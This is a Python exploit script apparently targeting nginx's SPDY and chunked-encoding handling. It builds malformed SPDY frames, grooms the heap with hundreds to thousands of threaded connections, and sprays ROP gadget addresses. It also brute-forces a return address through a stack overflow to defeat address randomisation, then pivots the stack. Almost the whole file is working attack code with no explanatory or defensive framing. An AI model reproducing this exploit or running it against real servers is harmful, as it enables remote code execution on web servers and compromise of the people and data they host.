import socket
import struct
import zlib
import threading
import time

CONCURRENT_STREAMS = 100
REQUEST_POOL_SIZE = 4096
CHEADER_BUF_SIZE = 1024

RECV_BUF_SZ = 256*1024 - 2 * 16     # STATE_BUF_SIZE

CTL_FRAME_HEAD = (1<<31) | (2<<16)
NGX_SPDY_SYN_STREAM = 1

# htonl
spdy_type = NGX_SPDY_SYN_STREAM
head = struct.pack(">I", CTL_FRAME_HEAD | spdy_type)
flag = 0xff
length = 0xffffff       # TODO
flen = struct.pack(">I", (flag<<24) | length)
sid = struct.pack(">I", 0xffffffff)
pad = "ZZZZ"
prio = "\xff" * 2

# inflate
# Use 1 header to fill whole 1023 bytes buf
nheaders = struct.pack(">H", 0x0001);
sw_name_len = 0x0001
sw_name_len_s = struct.pack(">H", sw_name_len)
sw_name = "a" * sw_name_len     # a-z, "-"
sw_val_len = (CHEADER_BUF_SIZE - 1) - len(nheaders) - len(sw_name_len_s) - len(sw_name) - 2   # sw_val_len
sw_val_len_s = struct.pack(">H", sw_val_len)
sw_val = "a" * sw_val_len

comp = ""
comp += nheaders
comp += sw_name_len_s
comp += sw_name
comp += sw_val_len_s
comp += sw_val
body = zlib.compress(comp + "PAADDING", 1)

# Round 2
# sc->handler = ngx_http_spdy_state_headers
# len(zlib.compress("abcdefgh")) == 16
# len(zlib.compress("a" * 842) == 16
# Make inflate fail, Exit
buffer_state = "?" * 16





payload = ""
payload += head
payload += flen
payload += sid
payload += pad
payload += prio
payload += body
payload += buffer_state
payload += "A" * (RECV_BUF_SZ - len(payload))

#overflow = "O" * RECV_BUF_SZ
overflow = "O" * 0x4000


######## Prepare #######
payload2 = ("POST /index.php HTTP/1.1\r\n"
            "HOST: localhost\r\n"
            "Accept: */*\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Content-Length: 262144\r\n"    #0x40000
            "\r\n")

payload2+= "123\r\n"
payload2+= "\xf0"*8 + "\r\n"
#payload2+= "\xde\xad\xbe\xef" * 0x40000
payload2+= "\xde\xad\xbe\xef" * 0x10000

##########################
#ROP Gadget
##########################
#ngxbase = 0
ngxbase = 0x400000
pop_rsp_ret = 0x5c9c
ret = 0x5c9d


sprydata2 = ""
sprydata2 += "POST /index.php HTTP/1.1\r\n"
sprydata2 += "HOST: localhost\r\n"
sprydata2 += "Accept: */*\r\n"
sprydata2 += "Transfer-Encoding: chunked\r\n"
sprydata2 += "Content-Length: 262144\r\n"    #0x40000
sprydata2 += "\r\n"

sprydata2 += "123\r\n"
sprydata2 += "\xf0"*8 + "\r\n"
#sprydata2 += "a" * 0x40000
rop = ""
rop += struct.pack('<Q', ngxbase + ret)
rop += struct.pack('<Q', 0xdeaddeadbeefbeef)
sprydata2 += "\x00"*3
sprydata2 += "D"*0x80
spryframe = ""
spryframe += struct.pack('<Q', ngxbase + ret) * ((1024 - len(rop))/8) + rop
sprydata2 += spryframe*(0x40000/1024)
#sprydata2 += struct.pack('<Q', ngxbase + ret) * ((1024 - len(rop) - 0x80)/8) + rop

######## Thread ########
def spdyFunc(index):
    global s
    global payload
    global overflow
    global sig
    s[index].send(payload)
    s[index].send(overflow)

    # Keep Thread Alive
    while(sig[index] == 0):
        time.sleep(1)

def sprayFunc(index, flag = 1):
    global s
    global payload2
    global sig
    if flag == 1:
        s[index].send(payload2)
    elif flag == 2:
        s[index].send(sprydata2)

    # Keep Thread Alive
    while(sig[index] == 0):
        time.sleep(1)


######## PWN ###########

HOST = "localhost"
PORT = 443
PORT2 = 80

sig = []
s = []

def FENGSHUI_pt():
    """
    client_body_buffer_size = 256k   ( > 128k )
    """
    global sig
    global s

    THREAD = 3#32

    sig = [ 0 for i in range(THREAD) ]
    
    s = [ socket.socket(socket.AF_INET, socket.SOCK_STREAM) for i in range(THREAD) ]
    
    for i in range(THREAD - 1):
        s[i].connect((HOST, PORT2))
    
    s[THREAD-1].connect((HOST, PORT))
    
    #t = [ threading.Thread(target=spdyFunc, args=(i,)) for i in range(THREAD) ]
    t = [ threading.Thread(target=sprayFunc, args=(0,)),
          threading.Thread(target=sprayFunc, args=(1,)),
          threading.Thread(target=spdyFunc, args=(2,)) ]
    
    for i in range(THREAD):
        t[i].daemon = True
        t[i].start()
    
    time.sleep(2)
    
    sig[0] = 1
    
    time.sleep(1)
    
    sig[1] = 1
    
    time.sleep(1)
    
    sig[2] = 1
    
    for i in range(THREAD):
        t[i].join()


def FENGSHUI_phk():
    """
    client_body_buffer_size = 1k   ( > 512 )
    """
    global sig
    global s

    ADJUST = 233
    PHKTHREAD = 512*3/4 - ADJUST

    sig = [ 0 for i in range(PHKTHREAD + 1) ]
    
    s = [ socket.socket(socket.AF_INET, socket.SOCK_STREAM) for i in range(PHKTHREAD + 1) ]
    
    for i in range(PHKTHREAD):
        s[i].connect((HOST, PORT2))

    s[PHKTHREAD].connect((HOST, PORT))
    
    t = [ threading.Thread(target=sprayFunc, args=(i,)) for i in range(PHKTHREAD) ]
    t.append( threading.Thread(target=spdyFunc, args=(PHKTHREAD,)) )
    
    for i in range(PHKTHREAD + 1):
        t[i].daemon = True
        t[i].start()

    time.sleep(8)  # or even longer

    for i in range(PHKTHREAD + 1):
        sig[i] = 1

    for i in range(PHKTHREAD + 1):
        t[i].join()


def STK_OVRRUN():
    global ngxbase

    ovfdata = ""
    ovfdata += "GET / HTTP/1.1\r\n"
    ovfdata += "HOST: localhost\r\n"
    ovfdata += "Transfer-Encoding: chunked\r\n"
    ovfdata += "\r\n"
    ovfdata += "A"*(6000-0x347)

    # Brute force Crack ret address
    raddr = ""
    for i in range(8):
        for j in range(256):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT2))
            s.send(ovfdata + raddr + chr(j))
            rdata = s.recv(1024)
            if len(rdata) != 0 :
                raddr += chr(j)
                break
            s.close()
            continue

    ngxbase = 0

    for i in raddr[::-1]:
        ngxbase <<= 8
        ngxbase += ord(i)

    ngxbase &= ~0xfffff
    #print hex(ngxbase)
    return ngxbase


def SPRAY_brk():
    """
    client_body_buffer_size = 127k ( < 128k )
    """
    global sig
    global s
    global ngxbase

    THREAD = 4096

    sig = [ 0 for i in range(THREAD) ]
    
    s = [ socket.socket(socket.AF_INET, socket.SOCK_STREAM) for i in range(THREAD) ]
    
    for i in range(THREAD):
        s[i].connect((HOST, PORT2))

    #t = [ threading.Thread(target=sprayFunc, args=(i,)) for i in range(THREAD) ]
    t = [ threading.Thread(target=sprayFunc, args=(i,2)) for i in range(THREAD) ]

    for i in range(THREAD):
        t[i].deamon = True
        t[i].start()

    time.sleep(800)  # or even longer

    ovfsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ovfsock.connect((HOST, PORT2))
    ovfdata = ""
    ovfdata += "GET / HTTP/1.1\r\n"
    ovfdata += "HOST: localhost\r\n"
    ovfdata += "Transfer-Encoding: chunked\r\n"
    ovfdata += "\r\n"
    ovfdata += "A"*(6000-0x347)
    ovfsock.send(ovfdata + struct.pack('<Q', ngxbase + pop_rsp_ret) + 'XXXXXXXX' + struct.pack('<Q', ngxbase + ret))

    time.sleep(8)

    for i in range(THREAD):
        sig[i] = 1

    for i in range(THREAD):
        t[i].join()

def SPRAY_mmap():
    """
    client_body_buffer_size = 128k (for phk, additional 2 pages will place between 2 buffers)
    stk_pivot_dest = 0x7fe0b58f3800
                        ----        12 bit entropy
    """
    global sig
    global s
    global ngxbase

    THREAD = 4096

    sig = [ 0 for i in range(THREAD) ]
    
    s = [ socket.socket(socket.AF_INET, socket.SOCK_STREAM) for i in range(THREAD) ]
    
    for i in range(THREAD):
        s[i].connect((HOST, PORT2))

    t = [ threading.Thread(target=sprayFunc, args=(i,2)) for i in range(THREAD) ]
    #t = [ threading.Thread(target=sprayFunc, args=(i,)) for i in range(THREAD) ]

    for i in range(THREAD):
        t[i].deamon = True
        t[i].start()

    time.sleep(200)  # or even longer

    ovfsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ovfsock.connect((HOST, PORT2))

    ovfdata = ""
    ovfdata += "GET / HTTP/1.1\r\n"
    ovfdata += "HOST: localhost\r\n"
    ovfdata += "Transfer-Encoding: chunked\r\n"
    ovfdata += "\r\n"
    ovfdata += "A"*(6000-0x347)
    ovfsock.send(ovfdata + struct.pack('<Q', ngxbase + pop_rsp_ret) + 'XXXXXXXX' + struct.pack('<Q', ngxbase + ret))

    time.sleep(2)

    for i in range(THREAD):
        sig[i] = 1

    for i in range(THREAD):
        t[i].join()


#FENGSHUI_pt()
SPRAY_brk()

